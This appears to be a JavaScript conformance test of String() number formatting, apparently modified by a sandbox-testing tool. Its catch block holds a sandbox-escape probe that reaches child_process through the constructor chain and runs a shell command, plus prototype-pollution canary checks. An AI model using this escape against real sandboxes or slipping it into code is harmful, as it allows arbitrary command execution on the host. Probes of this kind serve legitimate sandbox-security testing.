try {
    if (String(0.1) !== '0.1') {
        $ERROR('#1: String(0.1) === "0.1". Actual: ' + String(0.1));
    }
    if (String(0.000001) !== '0.000001') {
        $ERROR('#2: String(0.000001) === "0.000001". Actual: ' + String(0.000001));
    }
    if (String(0.000001) !== '0.000001') {
        $ERROR('#3: String(1e-6) === "0.000001". Actual: ' + String(0.000001));
    }
    if (String(0.000001) !== '0.000001') {
        $ERROR('#4: String(1E-6) === "0.000001". Actual: ' + String(0.000001));
    }
    if (String(-0.1) !== '-0.1') {
        $ERROR('#5: String(-0.1) === "-0.1". Actual: ' + String(-0.1));
    }
    if (String(-0.000001) !== '-0.000001') {
        $ERROR('#6: String(-0.000001) === "-0.000001". Actual: ' + String(-0.000001));
    }
    if (String(-0.000001) !== '-0.000001') {
        $ERROR('#7: String(-1e-6) === "0.000001". Actual: ' + String(-0.000001));
    }
    if (String(-0.000001) !== '-0.000001') {
        $ERROR('#8: String(-1E-6) === "0.000001". Actual: ' + String(-0.000001));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}